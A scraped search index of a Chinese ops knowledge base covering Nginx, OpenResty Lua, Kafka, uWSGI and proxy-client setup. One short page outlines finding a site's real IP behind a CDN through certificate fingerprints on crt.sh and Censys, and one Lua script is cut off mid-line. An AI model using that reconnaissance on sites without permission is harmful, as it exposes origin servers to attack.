proxy_set_header X-Request-Id $request_id; proxy_set_header x-b3-traceid $request_id; 扩展 查看当前系统打开句柄最大数量(默认为内存的10%，单位KB) `more /proc/sys/fs/file-max` >查看当前已经打开句柄总数 `lsof|awk '{print $2}'|wc -l` >根据打开文件句柄的数量降序排列，其中第二列为进程ID： `lsof|awk '{print $2}'|sort|uniq -c|sort -nr|more` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/3.Nginx黑名单.html":{"url":"Nginx/3.Nginx黑名单.html","title":"3.Nginx黑名单","keywords":"","body":"Nginx黑名单用于限制指定的IP访问Nginx 1、在nginx.conf的http中加入黑名单配置文件： include website/blockip.conf; 例(在http下新增以下第4行)：http { include mime.types; default_type application/octet-stream; #新增内容 include website/blockip.conf; 2、然后在conf目录下，创建website/blockip.conf mkdir /usr/local/nginx/conf/website touch /usr/local/nginx/conf/website/blockip.conf 3、编辑blockip.conf文件，在blockip.conf中增加需要封禁的ip(将IP更改为需要禁用访问的IP)，我的配置如下: [root@nrffnginx-1 website]# pwd /usr/local/nginx/conf/website [root@nrffnginx-1 website]# cat blockip.conf deny 42.96.128.0/17; deny 42.120.0.0/16; deny 42.121.0.0/16; deny 42.156.128.0/17; deny 110.75.0.0/16; deny 110.76.0.0/19; deny 110.76.32.0/20; deny 110.76.48.0/20; deny 110.173.192.0/20; deny 110.173.208.0/20; ....此处省略 4、最后reload nginx即可生效: /usr/local/nginx/sbin/nginx -s reload Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/4.Nginx反向代理配置.html":{"url":"Nginx/4.Nginx反向代理配置.html","title":"4.Nginx反向代理配置","keywords":"","body":"1、在HTTP下创建代理池 #新增名为portal_service_poo的代理池，后端有3台服务器的8080端口提供服务，keepalived很重要，决定http长链接连接池 upstream portal_service_pool { server 10.215.1.1:8080 weight=1 max_fails=0 fail_timeout=0s;; keepalive 100; } 2、在server监听下添加代理转发配置 server { listen 8080; charset utf-8; } #指定访问IP URL时转发到portal池处理 location / { proxy_pass http://portal_service_pool; } #指定访问IP:/aaa URL时转发到aaa池处理 location /aaa{ # 去除aaa转发到后端 rewrite ^/aaa/(.*) /$1 break; proxy_pass http://aaa_service_pool; } } 3、上述配置讲解 1、假设Nginx本机地址为192.168.1.1，当用户访问192.168.1.1时，请求转发给了portal_service_pool池里的服务器:8080端口处理 2、upstream里weight决定权重、max_failts和fail_timeout决定最大错误次数和超时时间。keepalive决定http长链接的连接池（http1、http1.1、http2的区别自行了解） Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Nginx/5.location规则.html":{"url":"Nginx/5.location规则.html","title":"5.location规则","keywords":"","body":"Location规则和if判断 Location匹配优先级和实例 ``` = 严格匹配。如果这个查询匹配，那么将停止搜索并立即处理此请求。 ~ 为区分大小写匹配(可用正则表达式) !~为区分大小写不匹配 ~ 为不区分大小写匹配(可用正则表达式) !~为不区分大小写不匹配 ^~ 如果把这个前缀用于一个常规字符串,那么告诉nginx 如果路径匹配那么不测试正则表达式。 location = / { 只匹配 / 查询。 } location / { 匹配任何查询，因为所有请求都已 / 开头。但是正则表达式规则和长的块规则将被优先和查询匹配。 } location ^~ /p_w_picpaths/ { 匹配任何已 /p_w_picpaths/ 开头的任何查询并且停止搜索。任何正则表达式将不会被测试。 } location ~*.(gif|jpg|jpeg)$ { 匹配任何已 gif、jpg 或 jpeg 结尾的请求。 } location ~*.(gif|jpg|swf)$ { valid_referers none blocked start.igrow.cn sta.igrow.cn; if ($invalid_referer) { 防盗链 rewrite ^/ http://$host/logo.png; } } > if判断嵌套 > 例：根据uri的参数进行灰度流量控制，重写URI代理到upstream # 判断uri参数里appkey的参数以0-9、a-b结尾触发uri的rewrite规则，比如将请求/api/goods修改为/open-api/goods #最后的last表示修改URL后继续执行nginx文件，继续使用Nginx配置文件下面的Location匹配路由 if ($arg_appkey ~* ^(.*)([0-9|[a-b])$) { rewrite ^/api/goods?$ /open-api/goods last; } location ^~ /open-api/ { # go-open-api nginx proxy_pass http://openapiv2; } ``` Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/6.日志格式化.html":{"url":"Nginx/6.日志格式化.html","title":"6.日志格式化","keywords":"","body":"常用的日志格式化格式 log_format json '{ \"@timestamp\": \"$time_iso8601\", ' '\"remote_addr\": \"$remote_addr\", ' '\"referer\": \"$http_referer\", ' '\"request\": \"$request\", ' '\"status\": $status, ' '\"bytes\":$body_bytes_sent, ' '\"agent\": \"$http_user_agent\", ' '\"x_forwarded\": \"$http_x_forwarded_for\", ' '\"upstr_addr\": \"$upstream_addr\",' '\"upstr_host\": \"$upstream_http_host\",' '\"ups_resp_time\": \"$upstream_response_time\" }'; access_log logs/access.log json Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/7.反向代理获取真实IP.html":{"url":"Nginx/7.反向代理获取真实IP.html","title":"7.反向代理获取真实IP","keywords":"","body":"在server中添加3个字段，然后再程序中通过获取Header中的X-Forwarded-For取出真实客户端IP server { listen 8090; server_name localhost; root html/h5; location /api/registerAfter/ { proxy_pass http://127.0.0.1:2022/; } location /callback/ { proxy_pass http://127.0.0.1:5022/; } location / { try_files $uri $uri/ /; index index.html index.htm; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/8.嵌入Lua定制高级功能.html":{"url":"Nginx/8.嵌入Lua定制高级功能.html","title":"8.嵌入Lua定制高级功能","keywords":"","body":"openresty+Lua 验签、调用限流、埋点实战 功能描述 1、对用户的请求进行签名验证，放行合法请求 2、所有请求里，根据appkey查询uid，将uid带给后端使用，降低后端查库压力 3、 可以针对每个appkey、每个接口进行调用次数限制 实现逻辑 # 前置：我们已经将MySQL的某个用户表直接实时同步到了redis中使用hash存储 1、提取uri中的appkey参数 2、利用appkey查询Redis中存储的uid，放入header头。如果查询不到uid直接返回错误 3、利用appkey查询Redis中存储的的secret生成签名，对比用户的签名，完成签名认证，签名通过则放行整个到后端请求 4、 利用redis的数值加钱功能，完成调用次数加减 5、解析请求，整理埋点数据发送到kafka，用于大数据离线分析 生产环境使用使用结果： 1G内存redis主从版qps就能轻松破万， 万级qps下cpu使用率20%左右 vhosts文件引入lua server { server_name openapiv2.itgod.org; .. 省略 # rewrite阶段引入lua，获取用户UID rewrite_by_lua_file conf/lua/scripts/openapiv2_uid.lua; # location 匹配需要验证签名的接口 location ~ ^/(open-api/a|open-api/b){ # access阶段引入lua验证签名 access_by_lua_file conf/lua/scripts/openapiv2.lua; proxy_pass http://$openapipassto; } .. 省略 openapiv2_uid.lua文件（功能： 查询UID，整理请求为埋点信息推送到kafka） local cjson = require \"cjson\" local ngx_log = ngx.log local ngx_err = ngx.ERR local redis = require \"resty.redis\" local uri = ngx.var.uri local red = redis:new() local args = ngx.req.get_uri_args() local ngx_say = ngx.say local appkey = args[\"appkey\"] local mdw_prefix = \"mysql_to_redis_node1:dtk_users_application\" if not appkey then appkey = args[\"appKey\"] end if not appkey then ngx.exit(0) -- 添加默认key --local cdnignore = ngx.req.get_headers(1) --if cdnignore then --ngx_log(ngx_err, \"=====\" .. cdnignore[\"cdn-ignore\"]) --ngx_log(ngx_err, \"=====wu\") --args[\"appKey\"] = '61a622c6501' --ngx.req.set_uri_args(args) --args = ngx.req.get_uri_args() --appkey = args[\"appKey\"] --end end local mess_return = function(mess, s) if s == nil then ngx.status = 200 else ngx.status = s end ngx_say(cjson.encode(mess)) local r, err = red:set_keepalive(100000, 50) ngx.exit(0) end local find_uid = function() local res, err = red:hmget(mdw_prefix .. ':' .. appkey, \"uid\") if res then local r, err = red:set_keepalive(100000, 50) return res else local mess = {} mess[\"message\"] = \"appkey不存在\" mess_return(mess, 439) end end ngx.header['Content-Type'] = 'application/json; charset=utf-8' -- redis初始 red:set_timeout(100) local red_option = {} red_option[\"pool_size\"] = 50 red_option[\"backlog\"] = 100 local ok, err = red:connect(\"xxxxx.redis.rds.aliyuncs.com\", 6379, red_option) if not ok then ngx.exit(0) end -- uid local uid = find_uid() ngx.req.set_header(\"uid\", uid) ngx.header[\"uid\"] = uid ---BI local producer = require \"resty.kafka.producer\" local cjson = require \"cjson\" local uri = ngx.var.request_uri local x_forwarded_for = ngx.var.http_x_forwarded_for --local user_agent = ngx.var.http_user_agent local biToKafka = function() local message = {} local producer = require \"resty.kafka.producer\" local cjson = require \"cjson\" local uri = ngx.var.request_uri local x_forwarded_for = ngx.var.http_x_forwarded_for local request_method = ngx.var.request_method local message = {} local broker_list = { { host = \"192.168.13.45\", port = 9092 }, { host = \"192.168.13.46\", port = 9092 }, { host = \"192.168.13.47\", port = 9092 } } local params = {} message[\"apiName\"] = ngx.var.uri message[\"appKey\"] = args[\"appkey\"] message[\"flag\"] = 0 message[\"ip\"] = ngx.var.http_x_forwarded_for message[\"link\"] = ngx.var.request_uri for k, v in pairs(args) do params[k] = v end message[\"requestTime\"] = os.date(\"%Y-%m-%d %H:%M:%S\", os.time()) .. \".000\" message[\"params\"] = params message = cjson.encode(message) --ngx_log(ngx_err, message) local bp = producer:new(broker_list, { producer_type = \"async\" }) bp:send(\"test\", null, message) end biToKafka() openapiv2.lua文件（功能：查询secret，并验证签名和调用次数限制） local cjson = require \"cjson\" local ngx_log = ngx.log local ngx_err = ngx.ERR local redis = require \"resty.redis\" local uri = ngx.var.uri local red = redis:new() local args = ngx.req.get_uri_args() local ngx_say = ngx.say local timer = args[\"timer\"] local nonce = args[\"nonce\"] local appkey = args[\"appkey\"] local keywords = {\"总\", \"接口\"} local mdw_prefix = \"mysql_to_redis_node1:dtk_users_application\" local ill_count = 1000000000 local today_sub = ngx.today() ngx.header['Content-Type'] = 'application/json; charset=utf-8' local mess_return = function(mess, s) if s == nil then ngx.status = 200 else ngx.status = s end ngx_say(cjson.encode(mess)) local r, err = red:set_keepalive(100000, 100) ngx.exit(0) end if not appkey then appkey = args[\"appKey\"] end --if not appkey or not timer or not nonce then if not appkey then local mess = {} mess[\"message\"] = \"appkey必要参数缺失，请检查\" mess_return(mess, 200) end local redis_key = mdw_prefix .. \":\" .. appkey .. \":\" .. \"Nginx:\" .. today_sub local find_appsecret = function() --#local res, err = red:hmget(mdw_prefix .. ':' .. appkey, \"app_secret\", \"uid\") local res, err = red:hget(mdw_prefix .. ':' .. appkey, \"app_secret\") if res then return res else return end end local appkey_decr_hset = function(field) local res, err = red:hincrby(redis_key, field, -1) if not res then return end return res end local gen_md5token = function(appsecret) if appkey and timer and nonce and appsecret then local osTimer = os.time() * 1000 - 600000 if tonumber(timer) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/9.实现宕机静态容灾.html":{"url":"Nginx/9.实现宕机静态容灾.html","title":"9.实现宕机静态容灾","keywords":"","body":" openresty+lua+memcache 实现静态容灾 实现原理 1、正常情况下在openresty上通过srcache和lua随机取样10%的请求 并将请求返回体写入到memcache中 2、当后端异常时从缓存获取数据。实现方法：判断Nginx的upstream response status，将5xx状态码重定向到缓存获取数据 引用模块：https://github.com/openresty/srcache-nginx-module 配置： # 设置一个随机数，进行流量采样 set srcache_v 0; access_by_lua_file 'conf/conf.d/luascripts/srcache_random.lua'; #根据uri设置需要被缓存的路由 if (uri ~ (/tk_zs/|/pmc/|/pay/|/cloud/|/set/|/ucenters/|/kfpt/)) { set srcache_v 2; } if (request_uri ~ \"_=[0-9]{10,13}\") { setsrcache_v 2; } set_md5 mem_keyuriargs; srcache_store PUT /memcmem_key; srcache_store_skip srcache_v; srcache_store_statuses 200 301 302; srcache_response_cache_control off; srcache_methods GET HEAD; srcache_ignore_content_encoding on; srcache_max_expire 10h; error_page 500 = @down_cache; error_page 502 = @down_cache; error_page 503 = @down_cache; error_page 504 = @down_cache; location = /memc { internal; memc_connect_timeout 100ms; memc_send_timeout 100ms; memc_read_timeout 100ms; memc_ignore_client_abort on; setmemc_key query_string; setmemc_exptime 36000; # memcache地址 memc_pass memcached; } location @down_cache { more_set_headers \"down-memcache: HIT\"; access_log /var/log/nginx/downcache.www.itgod.org.access.log json; srcache_fetch GET /memc $mem_key; } lua随机采样脚本 ngx.var.srcache_v = math.random(0,9) --ngx.log(ngx.ERR, \"===============================\") --ngx.log(ngx.ERR, ngx.var.srcache_v) memcache的upstram upstream memcached { server m-xxxxxx.memcache.rds.aliyuncs.com:11211 weight=5 max_fails=0 fail_timeout=0s; keepalive 100; } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/Nginx限流.html":{"url":"Nginx/Nginx限流.html","title":"Nginx限流","keywords":"","body":"优势： Nginx限流可以针对客户端的IP进行请求速率限制，既能够强行保证请求的实时处理速度，又能防止恶意攻击或突发流量导致系统被压垮，提升系统的健壮性。 在http模块中新增配置limit_req_zone全局配置 在http模块中新增配置limit_req_zone,如下： http { include mime.types; default_type application/octet-stream; server_tokens off; limit_req_zone $binary_remote_addr zone=mylimit:10m rate=2r/s; $binary_remote_addr表示根据remote_addr变量的值进行限制 zone=mylimit:10m 表示一个大小为10M，名字为myRateLimit的内存区域，根据官方描述，1M的内存大约可以存储16000个IP地址，10M则可以存储约16万IP地址，可以根据实际情况调整 rater=2r/s 表示限制每秒2个请求，Nginx 实际上以毫秒为粒度来跟踪请求信息，因此 2r/s 实际上是限制：每500毫秒处理一个请求。这意味着，自上一个请求处理完后，若后续500毫秒内又有请求到达，将拒绝处理该请求，默认返回503错误码，该错误码可以自定义。 在server中调用limit_req_zone 例： server { listen 8089; server_name localhost; root html/shigongbao; autoindex on; limit_req zone=mylimit burst=4 nodelay; location / { index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } zone=mylimit 表示调用http全局模块中定义的limit_req_zone zone名 burst=4 表示缓冲区突然流量处理，在超过设定的处理速率后能额外处理的请求数。当 rate=2r/s 时，将1s拆成2份，即每500ms可处理1个请求。 当同时有10个请求到达时，rate=2 立刻转发了2个请求到后端服务器，burst=4 缓存或立刻转发了4个请求（是否立刻转发主要看nodelay参数），丢弃了4个请求 Nodelay 针对的是burst参数，burst=4 nodelay 表示这4个请求立马处理，不能延迟，相当于特事特办。不过，即使这4个突发请求立马处理结束，后续来了请求也不会立马处理。burst=4 相当于缓存队列中占了4个坑，即使请求被处理了，这4个位置这只能按 500ms一个来释放。 执行ab压力测试 上述配置中rate=2r/s，burst=4，推理出第1秒可以一次性处理5个请求（因为rate=2 500毫秒内的第二个请求会被丢弃） 一次性发送5个请求测试结果，Failed requests: 0 [root@cs2 Yearning-go]# ab -n 5 -c 5 http://192.168.1.30:8089/ This is ApacheBench, Version 2.3 Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 192.168.1.30 (be patient).....done Server Software: nginx Server Hostname: 192.168.1.30 Server Port: 8089 Document Path: / Document Length: 394 bytes Concurrency Level: 5 Time taken for tests: 0.002 seconds Complete requests: 5 Failed requests: 0 Write errors: 0 Total transferred: 2545 bytes HTML transferred: 1970 bytes Requests per second: 2019.39 [#/sec] (mean) Time per request: 2.476 [ms] (mean) Time per request: 0.495 [ms] (mean, across all concurrent requests) Transfer rate: 1003.78 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 0 0 0.0 0 1 Processing: 1 1 0.1 1 1 Waiting: 1 1 0.1 1 1 Total: 1 1 0.1 1 1 Percentage of the requests served within a certain time (ms) 50% 1 66% 1 75% 1 80% 1 90% 1 95% 1 98% 1 99% 1 100% 1 (longest request) 一次性发送6个请求测试结果，有一个请求被丢弃，Failed requests: 1 [root@cs2 Yearning-go]# ab -n 6 -c 6 http://192.168.1.30:8089/ This is ApacheBench, Version 2.3 Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 192.168.1.30 (be patient).....done Server Software: nginx Server Hostname: 192.168.1.30 Server Port: 8089 Document Path: / Document Length: 394 bytes Concurrency Level: 6 Time taken for tests: 0.018 seconds Complete requests: 6 Failed requests: 1 (Connect: 0, Receive: 0, Length: 1, Exceptions: 0) Write errors: 0 Non-2xx responses: 1 Total transferred: 3226 bytes HTML transferred: 2464 bytes Requests per second: 328.62 [#/sec] (mean) Time per request: 18.258 [ms] (mean) Time per request: 3.043 [ms] (mean, across all concurrent requests) Transfer rate: 172.55 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 4 5 0.3 5 5 Processing: 5 5 0.0 5 5 Waiting: 5 5 0.1 5 5 Total: 9 9 0.3 10 10 ERROR: The median and mean for the total time are more than twice the standard deviation apart. These results are NOT reliable. Percentage of the requests served within a certain time (ms) 50% 10 66% 10 75% 10 80% 10 90% 10 95% 10 98% 10 99% 10 100% 10 (longest request) Nginx error日志记录被丢弃的包如下： 2020/07/29 16:00:08 [error] 4471#0: *895 limiting requests, excess: 4.982 by zone \"mylimit\", client: 192.168.1.40, server: localhost, request: \"GET / HTTP/1.0\", host: \"192.168.1.30:8089\" 生产环境限流实战案例 1、首先在nginx.conf的http块下申明内存空间 http { error_log /var/log/nginx/error.log; access_log /var/log/nginx/access.log; charset utf-8; include mime.types; default_type application/octet-stream; # 限流过程中有IP大客户，为大客户单独设置为限流IP白名单 geo $whiteIpList { default 1; 59.110.139.118 0; 101.133.138.27 0; } map $whiteIpList $binary_remote_addr_limit { 1 $binary_remote_addr; 0 \"\"; } # 分别为域名、uri中的appkey、客户端二进制IP地址设置不同的zone，不同的rate速度限制 limit_req_zone $http_host zone=open_api_domain:50m rate=2500r/s; limit_req_zone $arg_appkey zone=open_api_appkey:50m rate=200r/s; limit_req_zone $binary_remote_addr zone=zone_web_tmp:50m rate=5r/s; limit_req_zone $binary_remote_addr zone=zone_web:50m rate=50r/s; limit_req_zone $binary_remote_addr zone=zone_web_yjtg:50m rate=30r/s; limit_req_zone $binary_remote_addr_limit zone=zone_open_api:50m rate=40r/s; ... 省略 2、在域名的独立vhosts文件中申明使用哪个zone server { server_name openapi.itgod.org; listen 80; listen 443 ssl; access_log /var/log/nginx/openapi.itgod.org.access.log json; error_log /var/log/nginx/openapi.itgod.org.error.log; # 使用域名限制，设置burst预防突发流量，突发流量nodelay 0 延迟发送 limit_req zone=open_api_domain burst=50 nodelay; limit_req zone=open_api_appkey burst=100 nodelay; limit_req zone=zone_open_api burst=30 nodelay; limit_req_status 429; #more_set_headers \"Debug-For-Yxd: $arg_appkey\"; ....省略 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/try_files踩坑.html":{"url":"Nginx/try_files踩坑.html","title":"try_files踩坑","keywords":"","body":"K8S滚动更新时，应用版本不一致性引发的灾难 导致CDN错误的缓存了文件，请求v2.b.js文件，实际缓存了Index.html文件 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:14:29 "},"SSR/":{"url":"SSR/","title":"SSR","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:15:21 "},"SSR/ClashForAndroid.html":{"url":"SSR/ClashForAndroid.html","title":"Clash For Android","keywords":"","body":"下载安卓客户端打开后如图 添加Clash配置订阅 1、前往官网复制订阅地址 2、依次点击配置 —> 新配置 -> URL在URL一栏中粘贴Clash配置订阅链接；自动更新(分钟)推荐填写1440，即每24小时自动从链接中更新配置文件。 名称可以随便写 完成后点击右上角保存按钮将下载配置文件，请点击 选中 添加的配置文件。 开启代理 1、回到 Clash for Android主页，启动服务。在弹出的设置 VPN 中点击 “允许”，Clash for Android 便开始接管系统流量。 2、点击代理，在上方模式中选择对应节点即可。您亦可以选择相应应用，使用对应的代理节点。 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-14 06:30:27 "},"SSR/ClashForMac.html":{"url":"SSR/ClashForMac.html","title":"Clash For Mac","keywords":"","body":"下载安装Clash for Mac 添加订阅 前往官网 用户中心 复制 Clash 配置链接。打开 ClashX，点击菜单栏中的 ClashX 图标 打开菜单，进入 配置 > 托管配置 > 管理 在 托管的配置文件 窗口，点击 “添加”在 Url 一栏中输入 Clash 配置订阅链接，Config Name 为配置文件名，可以随意填写或留空。 添加成功后 ClashX 会自动从链接下载配置文件，等待 “更新时间” 刷新后，即可关闭窗口。 设置为系统代理 打开 ClashX 菜单中的 “设置为系统代理”，ClashX 便开始接管系统流量。ClashX 的默认出站模式为 “规则”，不推荐选择 “全局” 与 “直连”。 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-14 22:33:37 "},"SSR/ClashForWindows.html":{"url":"SSR/ClashForWindows.html","title":"Clash For Windows","keywords":"","body":"下载客户端 https://github.com/Fndroid/clash_for_windows_pkg/releases 复制订阅地址 登陆ssp.itgod.org复制订阅地址 配置客户端 设置为系统代理 完成... Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-14 06:27:48 "},"SSR/v2ray.html":{"url":"SSR/v2ray.html","title":"V 2 Ray","keywords":"","body":"Windows配置 1、网页上复制你的订阅地址 2、然后在客户端里添加订阅 3、添加订阅后，更新订阅就可以看到所有的服务器列表了 4、访问Google测试， 如果无法访问，继续往下检查最后一步 图标右键，系统代理设置为自动配置系统代理 Android配置 1、点击左侧设置，进入订阅分组设置后点右上角加号 2、添加订阅地址 3、回到首页，点击更新 4、启动服务后访问Google测试 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-17 01:49:26 "},"SSR/使用.html":{"url":"SSR/使用.html","title":"使用","keywords":"","body":"客户端下载 Windows客户端： 下载文件Android客户端： 下载文件Mac客户端：下载文件 导入链接 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-05 02:14:29 "},"UWSGI/":{"url":"UWSGI/","title":"UWSGI","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"UWSGI/Uwsgi+Flask.html":{"url":"UWSGI/Uwsgi+Flask.html","title":"Uwsgi Flask","keywords":"","body":"安装Uwsgi pip install uwsgi uwsgi.ini [uwsgi] socket = 0.0.0.0:9099 chdir = /usr/local/nginx/html/vip_itgod/ #module = vip_itgod.wsgi.py wsgi-file = /usr/local/nginx/html/vip_itgod/vip_itgod/wsgi.py master = true vhost = true no-site = true workers = 2 reload-mercy = 10 vacuum = true max-requests = 1000 limit-as = 512 buffer-size = 30000 #pidfile = /var/run/uwsgi9090.pid //pid文件，用于下面的脚本启动、停止该进程 daemonize = /usr/local/nginx/html/vip_itgod/uwsgi9090.log pythonpath = /usr/local/python3/lib/python3.6/site-packages/ Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-28 03:14:34 "},"安全/":{"url":"安全/","title":"安全","keywords":"","body":". Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-10-10 23:44:05 "},"安全/绕过CDN查找真实IP.html":{"url":"安全/绕过CDN查找真实IP.html","title":"绕过CDN查找真实IP","keywords":"","body":"利用SSL证书 1、查看证书SHA-256指纹2、通过crt.sh搜索sha-256指纹，获得证书指纹（Certificate Fingerprints）3、通过https://search.censys.io/search搜索证书指纹获得真实IP Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-10-10 23:37:31 "},"实用Demo/":{"url":"实用Demo/","title":"实用Demo","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"实用Demo/golang/":{"url":"实用Demo/golang/","title":"Golang","keywords":"","body":"Golang Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 04:24:55 "},"实用Demo/golang/kafka-demo.html":{"url":"实用Demo/golang/kafka-demo.html","title":"Kafka Demo","keywords":"","body":"producer 示例（partition 负载均衡） package main import ( \"context\" \"fmt\" \"github.com/segmentio/kafka-go\" \"strconv\" ) func main() { conn := kafka.Writer{ Addr: kafka.TCP(\"192.168.14.82:9092\"), Topic: \"yxdtest\", Balancer: &kafka.RoundRobin{}, } c := 0 for { if err := conn.WriteMessages(context.Background(), kafka.Message{ Value: []byte(strconv.Itoa(c)), }, ); err != nil { fmt.Println(err) } c += 1 fmt.Println(c) } } producer示例 package main import ( \"context\" \"fmt\" \"github.com/segmentio/kafka-go\" \"log\" \"time\" ) func main() { // to produce message topic := \"my-topic\" partition := 0 conn, err := kafka.DialLeader(context.Background(), \"tcp\", \"192.168.14.81:9092\", topic, partition) if err != nil { log.Fatal(\"failed to dial leader:\", err) } conn.SetWriteDeadline(time.Now().Add(10 * time.Second)) c := 0 for { _, err := conn.WriteMessages( kafka.Message{Value: []byte(\"sdfhsjdhfjsd\")}, ) if err != nil { log.Fatal(err) } c = c + 1 fmt.Println(c) break } } consumer示例 package main import ( \"context\" \"fmt\" \"github.com/segmentio/kafka-go\" \"log\" ) func main() { r := kafka.NewReader(kafka.ReaderConfig{ Brokers: []string{\"192.168.16.3:9092\"}, GroupID: \"stream-load\", Topic: \"OrderPullTikTokShopProd\", MinBytes: 10e3, // 10KB MaxBytes: 10e6, // 10MB }) ctx := context.Background() for { m, err := r.FetchMessage(ctx) if err != nil { break } fmt.Printf(\"message at topic/partition/offset %v/%v/%v: %s = %s\\n\", m.Topic, m.Partition, m.Offset, string(m.Key), string(m.Value)) //if find := strings.Contains(string(m.Value), \"HI\"); find { // fmt.Println(string(m.Value)) //} if err := r.CommitMessages(ctx, m); err != nil { log.Fatal(\"failed to commit messages:\", err) } } if err := r.Close(); err != nil { log.Fatal(\"failed to close reader:\", err) } } Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-11-25 05:11:56 "},"实用Demo/Python/":{"url":"实用Demo/Python/","title":"Python","keywords":"","body":"Python时间操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"实用Demo/Python/hashlib.html":{"url":"实用Demo/Python/hashlib.html","title":"Hashlib","keywords":"","body":" import hashlib m1 = hashlib.md5('yongxiaodong'.encode('utf-8')) res = m1.hexdigest() print(res) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 "},"实用Demo/Python/Python生产消费.html":{"url":"实用Demo/Python/Python生产消费.html","title":"Python生产消费","keywords":"","body":"生产消息 安装依赖包 pip install kafka-python from kafka import KafkaProducer producer = KafkaProducer( bootstrap_servers=['192.168.14.81:9092'] ) for _ in range(100): r = producer.send('itgod', b'some_message_bytes%s') re = r.get(timeout=5) print(re) producer.close() 生产消息（指定多个partition） 消费消息 from kafka import KafkaConsumer consumer = KafkaConsumer( 'dataoke2_dtk_users', bootstrap_servers='192.168.14.81:9092', group_id=\"py_for_y\" ) for message in consumer: print(\"%s:%d:%d: key=%s value=%s\" % (message.topic, message.partition, message.offset, message.key, message.value)) 消费消息（指定多个partition和消费组名） from kafka import KafkaConsumer from kafka.structs import TopicPartition import datetime consumer = KafkaConsumer( # 'logcoll-v2', # auto_offset_reset='earliest', bootstrap_servers='192.168.13.46:9092', group_id=\"pythontest\" ) tp = \"RespGoodsInfoTemp\" offs = 319065439 topcum = 24 L = [] for i in range(topcum): L.append(TopicPartition(topic=tp, partition=i)) consumer.assign(L) for i in range(24): consumer.seek(TopicPartition(topic=tp, partition=i), offs) for message in consumer: print(\"%s:%d:%d: key=%s value=%s\" % (message.topic, message.partition, message.offset, message.key, message.value)) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-11-25 05:11:56 "},"实用Demo/Python/时间操作.html":{"url":"实用Demo/Python/时间操作.html","title":"时间操作","keywords":"","body":"time模块 时间戳 import time time.time() 格式化时间, 主要用于展示使用 import time time.strftime('%Y-%m-%d %H:%M:%S') # 也可以使用%X 代替%H:%M:%S，如： time.strftime('%Y-%m-%d %X') 获取详细的时间信息, struct_time import time res = time.localtime() # 获取年 res.tm_year datetime 模块 ，可以用在需要进行时间天数、分钟、周等加减的场景 获取时间 import datetime print(datetime.datetime.now()) # 世界标准时间 print(datetime.datetime.utcnow()) 时间的加减 import datetime # 时间往后加2天 datetime.datetime.now() + datetime.timedelta(days=2) # 时间往后加2分钟 datetime.datetime.now() + datetime.timedelta(minutes=2) # 时间往后加2周 datetime.datetime.now() + datetime.timedelta(weeks=2) 时间戳转struct_time 时间 import datetime datetime.datetime.fromtimestamp(343434) format string time timestamp 互相转换 import time # 字符串时间 s = '1996-11-23 10:00:00' # 字符串时间转换为 struct_time struct_time = time.strptime(s, '%Y-%m-%d %H:%M:%S') #print(struct_time) # time.struct_time(tm_year=1996, tm_mon=11, tm_mday=23, tm_hour=10, tm_min=0, tm_sec=0, tm_wday=5, tm_yday=328, tm_isdst=-1) # struct_time 转换为timestamp 并 加7天的秒钟数 timestamp = time.mktime(struct_time) + 7 * 86400 # print(timestamp) # 849319200.0 # 再将timestamp转换为展示时间 res = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp)) # print(res) # 1996-11-30 10:00:00 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-07 03:55:23 